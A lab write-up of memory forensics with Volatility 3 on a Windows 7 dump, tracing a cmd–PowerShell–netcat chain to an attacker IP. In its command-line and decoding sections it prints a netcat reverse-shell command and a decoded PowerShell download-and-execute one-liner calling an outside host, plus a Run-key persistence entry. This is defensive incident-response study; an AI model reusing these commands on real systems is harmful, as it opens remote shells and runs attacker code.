# WU-001 — Memory Forensics with Volatility

| Field | Detail |
|---|---|
| **ID** | WU-001 |
| **Platform** | TryHackMe — "Volatility" Room |
| **Category** | Memory Forensics |
| **Tools** | Volatility 3, strings, grep |
| **Difficulty** | ⭐⭐ Medium |
| **Date** | 2025 |

---

## 1. Preparation — Setup and Hypothesis

**Objective:** Analyze a RAM memory dump to identify malicious processes, suspicious network connections, and possible indicators of compromise (IoCs).

**Environment:**
```bash
# Check the Volatility version
python3 vol.py --version
# Volatility 3 Framework 2.x

# Evidence file
ls -lh memory.dmp
# -rw-r--r-- 1 analyst analyst 2.1G Apr 14 03:22 memory.dmp

# Calculate SHA-256 hash (chain of custody)
sha256sum memory.dmp > memory.dmp.sha256
cat memory.dmp.sha256
```

**Initial hypothesis:** The system may be compromised by malware that establishes persistence and C2 communications.

---

## 2. Identification — Evidence Collection

### 2.1 Identify the Operating System

```bash
python3 vol.py -f memory.dmp windows.info
```

```
Variable        Value
Kernel Base     0xf80002a48000
DTB             0x187000
Symbols         file:///volatility3/symbols/windows/ntkrnlmp.pdb/...
Is64Bit         True
IsPAEEnabled    True
primary         0 WindowsIntel32e
memory_layer    1 FileLayer

NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  6
NtMinorVersion  1
PE MajorOperatingSystemVersion  6
```

→ **Windows 7 x64** identified.

### 2.2 List Active Processes

```bash
python3 vol.py -f memory.dmp windows.pslist
```

```
PID    PPID   ImageFileName        Offset(V)    Threads  Handles
4      0      System               ...          95       411
272    4      smss.exe             ...          3        29
348    336    csrss.exe            ...          9        438
388    380    wininit.exe          ...          3        75
...
2452   1748   explorer.exe         ...          33       854
2784   2452   cmd.exe              ...          1        19
2912   2784   powershell.exe       ...          5        340      ← suspicious
3120   2912   nc.exe               ...          1        14       ← ⚠ ALERT
```

**Suspicious process identified:** `nc.exe` (netcat) being executed by `powershell.exe`, which was launched by `cmd.exe` under `explorer.exe`. This is an unusual execution chain.

### 2.3 Check Network Connections

```bash
python3 vol.py -f memory.dmp windows.netstat
```

```
Offset   Proto  LocalAddr        LocalPort  ForeignAddr      ForeignPort  State     PID
...
0x...    TCPv4  192.168.1.105    49320      185.220.101.47   4444         ESTABLISHED  3120
```

→ `nc.exe` (PID 3120) has an **ESTABLISHED** connection to `185.220.101.47:4444` — a port commonly used by Metasploit/netcat reverse shells.

### 2.4 Dump the Suspicious Process

```bash
python3 vol.py -f memory.dmp windows.dumpfiles --pid 3120
# Output: pid.3120.nc.exe.0x...img

# Check the hash against malware databases
sha256sum pid.3120.nc.exe.0x...img
# Search on VirusTotal
```

```bash
# Extract strings from the binary
strings pid.3120.nc.exe.0x...img | grep -E "185\.|4444|powershell|cmd"
```

---

## 3. Containment — Scope Delimitation

### 3.1 Execution Timeline

```bash
python3 vol.py -f memory.dmp windows.pstree
```

```
* 2452  explorer.exe
** 2784  cmd.exe         [created: 03:18:42]
*** 2912  powershell.exe  [created: 03:18:43]
**** 3120  nc.exe          [created: 03:18:45]
```

→ The entire chain was created within a 3-second interval — indicative of automated execution (script or exploit).

### 3.2 Check Clipboard and Recent Commands

```bash
python3 vol.py -f memory.dmp windows.cmdline
```

```
PID    Process          Args
2784   cmd.exe          "C:\Windows\system32\cmd.exe"
2912   powershell.exe   powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AcABhAHkAbABvAGEAZAAnACkA
3120   nc.exe           nc.exe -e cmd.exe 185.220.101.47 4444
```

**Base64-encoded PowerShell identified.** Decode it:

```bash
echo "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3AC8AcABhAHkAbABvAGEAZAAnACkA" | base64 -d
# IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/payload')
```

→ The payload downloaded and executed a script from `185.220.101.47` via `IEX` (Invoke-Expression) — a classic fileless malware technique.

---

## 4. Eradication — Root Cause

### 4.1 Check Registry Persistence

```bash
python3 vol.py -f memory.dmp windows.registry.printkey \
  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

```
Key: Run
Last Written: 2024-04-14 03:17:55
Name: WindowsUpdate
Type: REG_SZ
Data: powershell -nop -w hidden -enc SQBFAFgA...
```

→ **Persistence via Run key** — the payload executes automatically at every login.

### 4.2 Probable Root Cause

The event chain suggests:
1. The user executed `cmd.exe` (probably via phishing or an Office macro)
2. PowerShell downloaded a payload from an external C2 server
3. Netcat established a reverse shell to `185.220.101.47:4444`
4. The attacker added a registry key for persistence

---

## 5. Recovery — Impact and Recovery

**Estimated impact:**
- Reverse shell active for ~4 minutes (03:18:45 → memory dump time)
- Interactive system access with the compromised user's privileges
- Persistence installed — the system would become reinfected after restart

**Remediation actions:**
- Isolate the system from the network immediately
- Remove the `Run\WindowsUpdate` registry key
- Change all credentials belonging to the affected user
- Image the disk for additional analysis (Autopsy)
- Block `185.220.101.47` on the perimeter firewall
- Review email logs to identify the initial vector (phishing)

---

## 6. Lessons Learned

| Observation | Recommendation |
|---|---|
| PowerShell with `-enc` was not blocked | Implement AMSI + PowerShell Constrained Language Mode |
| `nc.exe` executed without alerts | EDR with behavioral detection (LOLBAS) |
| Traffic to :4444 was not blocked | Egress firewall with destination allowlist |
| Run key persistence was not detected | Monitor registry changes (Sysmon Event ID 13) |

---

## IoCs (Indicators of Compromise)

```
C2 IP    : 185.220.101.47
Port     : 4444/TCP
Process  : nc.exe (PID 3120)
Registry : HKCU\...\Run\WindowsUpdate
Command  : powershell -nop -w hidden -enc [base64]
nc hash  : [SHA-256 of the extracted binary]
```

---

## Tools Used

| Tool | Version | Key Command |
|---|---|---|
| Volatility 3 | 2.x | `python3 vol.py -f memory.dmp windows.pslist` |
| strings | GNU binutils | `strings pid.3120.img \| grep -E "185\.\|4444"` |
| base64 | coreutils | `echo [payload] \| base64 -d` |
| sha256sum | coreutils | `sha256sum memory.dmp` |

---

*[← Back to index](../README.md)*
